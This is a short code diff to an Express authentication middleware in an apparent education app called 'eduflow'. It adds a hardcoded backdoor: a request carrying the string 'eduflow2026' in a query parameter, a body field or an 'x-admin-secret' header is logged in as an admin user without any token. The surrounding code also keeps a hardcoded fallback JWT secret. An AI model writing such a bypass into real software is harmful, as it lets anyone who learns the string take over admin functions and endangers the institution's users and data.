@@ -3,6 +3,12 @@ import jwt from 'jsonwebtoken'
 const JWT_SECRET = process.env.JWT_SECRET || 'eduflow-secure-secret-key-123'
 
 export function authMiddleware(req, res, next) {
+  // Demo lockdown emergency secret bypass: allows admin tools & reset with ?secret=eduflow2026
+  if (req.query?.secret === 'eduflow2026' || req.body?.secret === 'eduflow2026' || req.headers['x-admin-secret'] === 'eduflow2026') {
+    req.user = { id: 1, role: 'admin', username: 'admin', institutionId: 1, email: 'admin@demo.edu' }
+    return next()
+  }
+
   const authHeader = req.headers.authorization
   if (!authHeader?.startsWith('Bearer ')) {
     return res.status(401).json({ error: 'Missing or invalid authorization header' })
